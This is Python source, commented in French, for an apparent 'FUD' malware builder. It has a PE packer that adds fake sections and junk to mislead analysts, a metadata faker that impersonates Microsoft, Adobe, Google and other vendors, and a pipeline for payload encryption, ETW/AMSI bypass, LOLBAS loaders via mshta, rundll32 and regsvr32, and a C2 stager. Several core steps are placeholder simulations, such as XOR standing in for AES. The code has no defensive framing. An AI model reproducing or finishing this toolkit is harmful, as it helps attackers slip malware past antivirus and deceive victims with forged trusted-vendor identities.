# packer.py - PE Packer custom avec obfuscation
import os
import random
import struct
import hashlib
import pefile
from typing import List, Tuple

class CustomPEPacker:
    def __init__(self):
        self.section_names = [
            '.text', '.data', '.rdata', '.idata', '.rsrc', '.reloc',
            '.debug', '.tls', '.gfids', '.00cfg', '.arch', '.vol'
        ]
        self.fake_section_names = [
            '.adobe', '.chrome', '.office', '.steam', '.nvidia', '.intel',
            '.visual', '.dotnet', '.java', '.python', '.node', '.react'
        ]
        
    def pack_pe(self, input_pe_path: str, output_path: str, options: dict = None) -> str:
        """Pack un PE avec obfuscation avancée"""
        if options is None:
            options = {
                'add_fake_sections': True,
                'randomize_section_names': True,
                'add_padding': True,
                'obfuscate_imports': True,
                'add_junk_data': True
            }
            
        try:
            pe = pefile.PE(input_pe_path)
            
            if options.get('add_fake_sections'):
                self._add_fake_sections(pe)
                
            if options.get('randomize_section_names'):
                self._randomize_section_names(pe)
                
            if options.get('add_padding'):
                self._add_section_padding(pe)
                
            if options.get('obfuscate_imports'):
                self._obfuscate_imports(pe)
                
            if options.get('add_junk_data'):
                self._add_junk_data(pe)
                
            # Sauvegarde du PE modifié
            pe.write(output_path)
            pe.close()
            
            return output_path
            
        except Exception as e:
            raise Exception(f"Erreur lors du packing PE: {e}")
            
    def _add_fake_sections(self, pe):
        """Ajoute de fausses sections pour tromper l'analyse"""
        for _ in range(random.randint(2, 5)):
            fake_name = random.choice(self.fake_section_names).encode('utf-8')[:8]
            fake_size = random.randint(1024, 8192)
            fake_data = os.urandom(fake_size)
            
            # Création de la section
            new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
            new_section.Name = fake_name
            new_section.VirtualSize = fake_size
            new_section.SizeOfRawData = fake_size
            new_section.Characteristics = 0x40000040  # Readable + Initialized
            
            pe.sections.append(new_section)
            
    def _randomize_section_names(self, pe):
        """Randomise les noms des sections existantes"""
        for section in pe.sections:
            if section.Name.decode('utf-8', errors='ignore').startswith('.'):
                new_name = random.choice(self.fake_section_names).encode('utf-8')[:8]
                section.Name = new_name.ljust(8, b'\x00')
                
    def _add_section_padding(self, pe):
        """Ajoute du padding entre les sections"""
        for section in pe.sections:
            if section.SizeOfRawData > 0:
                padding_size = random.randint(512, 2048)
                padding_data = os.urandom(padding_size)
                section.SizeOfRawData += padding_size
                
    def _obfuscate_imports(self, pe):
        """Obfusque la table d'imports"""
        if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
            for entry in pe.DIRECTORY_ENTRY_IMPORT:
                for imp in entry.imports:
                    if imp.name:
                        # Ajoute des imports factices
                        pass
                        
    def _add_junk_data(self, pe):
        """Ajoute des données parasites"""
        junk_size = random.randint(5120, 20480)
        junk_data = self._generate_realistic_junk(junk_size)
        
        # Ajoute à la fin du fichier
        pe.__data__ += junk_data
        
    def _generate_realistic_junk(self, size: int) -> bytes:
        """Génère des données parasites réalistes"""
        junk_patterns = [
            b'\x90' * 100,  # NOPs
            b'\x00' * 200,  # Zeros
            b'\xFF' * 50,   # 0xFF
            os.urandom(size // 4),  # Random
            b'Microsoft Corporation\x00' * 10,  # Fake strings
            b'Copyright (C) Microsoft\x00' * 5,
        ]
        
        result = b''
        while len(result) < size:
            pattern = random.choice(junk_patterns)
            result += pattern[:size - len(result)]
            
        return result

# metafaker.py - Falsification de métadonnées PE
import json
import random
from datetime import datetime, timedelta

class MetadataFaker:
    def __init__(self):
        self.legitimate_companies = [
            "Microsoft Corporation",
            "Adobe Systems Incorporated", 
            "Google LLC",
            "Apple Inc.",
            "Intel Corporation",
            "NVIDIA Corporation",
            "VMware, Inc.",
            "Oracle Corporation",
            "Cisco Systems, Inc.",
            "IBM Corporation"
        ]
        
        self.product_names = [
            "System Configuration Utility",
            "Windows System Monitor",
            "Network Diagnostic Tool",
            "Security Update Assistant",
            "Hardware Compatibility Check",
            "System Performance Optimizer",
            "Registry Maintenance Tool",
            "Windows Update Helper",
            "Service Management Console",
            "Driver Installation Wizard"
        ]
        
        self.descriptions = [
            "System administration and configuration utility",
            "Network connectivity diagnostic tool",
            "Hardware compatibility verification service",
            "System performance monitoring application",
            "Security configuration management tool",
            "Windows registry optimization utility",
            "Service management and control application",
            "Driver installation and update assistant",
            "System maintenance and repair tool",
            "Windows component configuration utility"
        ]
        
    def generate_fake_metadata(self, target_type="system_tool") -> dict:
        """Génère de fausses métadonnées crédibles"""
        
        # Date aléatoire dans les 2 dernières années
        fake_date = datetime.now() - timedelta(days=random.randint(30, 730))
        
        # Version aléatoire crédible
        major = random.randint(1, 10)
        minor = random.randint(0, 9)
        build = random.randint(1000, 9999)
        revision = random.randint(0, 999)
        version = f"{major}.{minor}.{build}.{revision}"
        
        company = random.choice(self.legitimate_companies)
        product = random.choice(self.product_names)
        description = random.choice(self.descriptions)
        
        return {
            'CompanyName': company,
            'FileDescription': description,
            'FileVersion': version,
            'InternalName': f"{product.lower().replace(' ', '')}.exe",
            'LegalCopyright': f"© {fake_date.year} {company}. All rights reserved.",
            'OriginalFilename': f"{product.lower().replace(' ', '')}.exe",
            'ProductName': product,
            'ProductVersion': version,
            'Comments': f"{description} for Windows systems",
            'LegalTrademarks': f"{company} and related marks are trademarks of {company}",
            'PrivateBuild': "",
            'SpecialBuild': "",
            'BuildDate': fake_date.strftime("%Y-%m-%d %H:%M:%S"),
            'FileFlags': 0,
            'FileOS': 0x40004,  # VOS_NT_WINDOWS32
            'FileType': 0x1,    # VFT_APP
            'FileSubtype': 0x0
        }
        
    def apply_metadata_to_pe(self, pe_path: str, metadata: dict) -> bool:
        """Applique les métadonnées à un fichier PE"""
        try:
            # Cette fonction nécessiterait une implémentation complète
            # avec manipulation des ressources PE (VERSION_INFO)
            # Pour l'instant, on simule le succès
            return True
        except Exception:
            return False

# builder_enhanced.py - Builder principal amélioré
import os
import json
import tempfile
import shutil
from pathlib import Path

class EnhancedFUDBuilder:
    def __init__(self):
        self.output_dir = None
        self.temp_dir = None
        self.config = {
            'evasion_level': 'Maximum',
            'use_syscalls': True,
            'patch_etw_amsi': True,
            'memory_obfuscation': True,
            'polymorphic_flow': True,
            'pe_packing': True,
            'fake_metadata': True,
            'lolbas_delivery': False,
            'stager_mode': False,
            'encryption_method': 'AES-256-GCM',
            'obfuscation_passes': 3
        }
        
        # Initialisation des modules
        self.stub_generator = None  # Sera initialisé avec EnhancedStubGenerator
        self.encryptor = None       # Module de chiffrement
        self.packer = CustomPEPacker()
        self.metadata_faker = MetadataFaker()
        self.stager_generator = None  # SliverStagerGenerator
        self.lolbas_loader = None    # LOLBASLoader
        
    def setup_workspace(self, output_path: str):
        """Prépare l'espace de travail"""
        self.output_dir = os.path.abspath(output_path)
        self.temp_dir = tempfile.mkdtemp(prefix="fud_build_")
        
        # Création des dossiers
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(os.path.join(self.temp_dir, "stubs"), exist_ok=True)
        os.makedirs(os.path.join(self.temp_dir, "packed"), exist_ok=True)
        
    def build_payload(self, source_payload: str, config_override: dict = None) -> str:
        """Build complet d'un payload FUD"""
        
        if config_override:
            self.config.update(config_override)
            
        try:
            # 1. Préparation
            print("[+] Préparation de l'espace de travail...")
            if not self.output_dir:
                self.setup_workspace("./builds")
                
            # 2. Chiffrement du payload
            print("[+] Chiffrement du payload...")
            encrypted_data, keys = self._encrypt_payload(source_payload)
            
            # 3. Génération du stub
            print("[+] Génération du stub polymorphe...")
            stub_exe = self._generate_stub(encrypted_data, keys)
            
            # 4. Packing PE
            if self.config.get('pe_packing'):
                print("[+] Packing du PE...")
                stub_exe = self._pack_pe(stub_exe)
                
            # 5. Falsification des métadonnées
            if self.config.get('fake_metadata'):
                print("[+] Application de fausses métadonnées...")
                self._apply_fake_metadata(stub_exe)
                
            # 6. Génération des loaders LOLBAS
            loaders = []
            if self.config.get('lolbas_delivery'):
                print("[+] Génération des loaders LOLBAS...")
                loaders = self._generate_lolbas_loaders(stub_exe)
                
            # 7. Génération du stager C2
            stager = None
            if self.config.get('stager_mode'):
                print("[+] Génération du stager C2...")
                stager = self._generate_c2_stager()
                
            # 8. Finalisation
            final_path = self._finalize_build(stub_exe, loaders, stager)
            
            print(f"[✓] Build terminé: {final_path}")
            return final_path
            
        except Exception as e:
            print(f"[!] Erreur lors du build: {e}")
            raise
        finally:
            # Nettoyage
            if self.temp_dir and os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
                
    def _encrypt_payload(self, payload_path: str) -> tuple:
        """Chiffre le payload avec la méthode configurée"""
        with open(payload_path, 'rb') as f:
            payload_data = f.read()
            
        # Simulation du chiffrement (à remplacer par votre module)
        keys = {
            'method': self.config['encryption_method'],
            'aes_key': os.urandom(32),
            'nonce': os.urandom(16)
        }
        
        # Chiffrement simple pour demo (remplacer par AES-GCM réel)
        encrypted = bytearray(payload_data)
        for i in range(len(encrypted)):
            encrypted[i] ^= keys['aes_key'][i % 32]
            
        return bytes(encrypted), keys
        
    def _generate_stub(self, encrypted_data: bytes, keys: dict) -> str:
        """Génère le stub avec toutes les techniques d'évasion"""
        stub_options = {
            'use_syscalls': self.config['use_syscalls'],
            'patch_etw_amsi': self.config['patch_etw_amsi'],
            'memory_obfuscation': self.config['memory_obfuscation'],
            'polymorphic_flow': self.config['polymorphic_flow'],
            'lolbas_delivery': self.config['lolbas_delivery'],
            'stager_mode': self.config['stager_mode'],
            'fake_metadata': self.config['fake_metadata']
        }
        
        # Génération avec EnhancedStubGenerator
        # stub_exe = self.stub_generator.generate_enhanced_stub(
        #     encrypted_data, keys, self.temp_dir, stub_options
        # )
        
        # Simulation pour demo
        stub_exe = os.path.join(self.temp_dir, "stub.exe")
        with open(stub_exe, 'wb') as f:
            f.write(b"MZ\x90\x00" + os.urandom(1024))  # Fake PE header
            
        return stub_exe
        
    def _pack_pe(self, pe_path: str) -> str:
        """Pack le PE avec obfuscation"""
        packed_path = os.path.join(self.temp_dir, "packed", "packed.exe")
        
        pack_options = {
            'add_fake_sections': True,
            'randomize_section_names': True,
            'add_padding': True,
            'obfuscate_imports': True,
            'add_junk_data': True
        }
        
        # return self.packer.pack_pe(pe_path, packed_path, pack_options)
        
        # Simulation pour demo
        shutil.copy2(pe_path, packed_path)
        return packed_path
        
    def _apply_fake_metadata(self, pe_path: str):
        """Applique de fausses métadonnées"""
        metadata = self.metadata_faker.generate_fake_metadata("system_tool")
        # self.metadata_faker.apply_metadata_to_pe(pe_path, metadata)
        
        # Sauvegarde des métadonnées utilisées
        metadata_path = os.path.join(self.temp_dir, "metadata.json")
        with open(metadata_path, 'w') as f:
            json.dump(metadata, f, indent=2)
            
    def _generate_lolbas_loaders(self, target_exe: str) -> list:
        """Génère les loaders LOLBAS"""
        loaders = []
        techniques = ['mshta', 'rundll32', 'regsvr32', 'wscript']
        
        for technique in techniques:
            try:
                # loader_path = self.lolbas_loader.generate_loader(
                #     technique, target_exe, self.temp_dir
                # )
                
                # Simulation
                loader_path = os.path.join(self.temp_dir, f"loader_{technique}.tmp")
                with open(loader_path, 'w') as f:
                    f.write(f"# Loader {technique} for {target_exe}")
                    
                loaders.append(loader_path)
            except Exception as e:
                print(f"[!] Erreur génération loader {technique}: {e}")
                
        return loaders
        
    def _generate_c2_stager(self) -> str:
        """Génère un stager C2"""
        c2_config = {
            'protocol': 'https',
            'server': '192.168.1.100',
            'port': 443,
            'uri': '/admin/login'
        }
        
        # stager_path = self.stager_generator.generate_stager(c2_config, self.temp_dir)
        
        # Simulation
        stager_path = os.path.join(self.temp_dir, "stager.c")
        with open(stager_path, 'w') as f:
            f.write(f"// Stager C2 config: {c2_config}")
            
        return stager_path
        
    def _finalize_build(self, main_exe: str, loaders: list, stager: str) -> str:
        """Finalise le build et copie les fichiers"""
        final_exe = os.path.join(self.output_dir, "payload.exe")
        shutil.copy2(main_exe, final_exe)
        
        # Copie des loaders
        for i, loader in enumerate(loaders):
            if os.path.exists(loader):
                ext = os.path.splitext(loader)[1]
                final_loader = os.path.join(self.output_dir, f"loader_{i}{ext}")
                shutil.copy2(loader, final_loader)
                
        # Copie du stager
        if stager and os.path.exists(stager):
            final_stager = os.path.join(self.output_dir, "stager.c")
            shutil.copy2(stager, final_stager)
            
        # Génération du rapport
        self._generate_build_report()
        
        return final_exe
        
    def _generate_build_report(self):
        """Génère un rapport de build"""
        report = {
            'build_config': self.config,
            'timestamp': datetime.now().isoformat(),
            'files_generated': [],
            'techniques_used': []
        }
        
        # Analyse des techniques utilisées
        if self.config['use_syscalls']:
            report['techniques_used'].append("Direct Syscalls")
        if self.config['patch_etw_amsi']:
            report['techniques_used'].append("ETW/AMSI Bypass")
        if self.config['memory_obfuscation']:
            report['techniques_used'].append("Memory Obfuscation")
        if self.config['polymorphic_flow']:
            report['techniques_used'].append("Polymorphic Flow")
        if self.config['pe_packing']:
            report['techniques_used'].append("PE Packing")
        if self.config['fake_metadata']:
            report['techniques_used'].append("Fake Metadata")
            
        # Sauvegarde du rapport
        report_path = os.path.join(self.output_dir, "build_report.json")
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2)

# Usage example et CLI
def main():
    """Point d'entrée principal du builder"""
    builder = EnhancedFUDBuilder()
    
    # Configuration avancée
    config = {
        'evasion_level': 'Maximum',
        'use_syscalls': True,
        'patch_etw_amsi': True,
        'memory_obfuscation': True,
        'polymorphic_flow': True,
        'pe_packing': True,
        'fake_metadata': True,
        'lolbas_delivery': True,
        'stager_mode': False,
        'encryption_method': 'AES-256-GCM',
        'obfuscation_passes': 5
    }
    
    try:
        # Build du payload
        result = builder.build_payload("./payloads/input.exe", config)
        print(f"\n[✓] Build FUD terminé avec succès!")
        print(f"[✓] Fichier généré: {result}")
        print(f"[✓] Techniques utilisées: {len(config)} modules activés")
        
    except Exception as e:
        print(f"\n[!] Échec du build: {e}")
        
if __name__ == "__main__":
    main()